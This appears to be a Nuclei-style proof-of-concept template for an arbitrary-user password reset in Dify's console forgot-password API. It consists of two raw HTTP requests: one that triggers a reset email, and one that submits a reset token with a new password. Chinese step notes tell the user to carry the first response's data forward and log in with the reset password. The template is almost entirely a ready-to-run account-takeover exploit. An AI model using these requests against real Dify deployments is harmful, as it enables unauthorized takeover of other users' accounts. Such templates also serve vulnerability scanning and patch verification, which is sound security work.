id: poc-vssxohfwsp4hbqo2
info:
  name: Dify forgot-password存在任意用户密码重置
  author: hacktwo
  severity: high
  description: ''
  tags: other,2025
http:
- raw:
  - 'POST /console/api/forgot-password HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json

    {"email":"test@qq.com","language":"zh-Hans"}


    取第一步的data放入后续'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'POST /console/api/forgot-password/resets HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json

    {"token": "68430164-eda9-4f78-8d9d-df7cbd76e13e","new_password":"123sadxQ@D214!!!","password_confirm":"123sadxQ@D214!!!"}


    使用重置后的密码登录'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
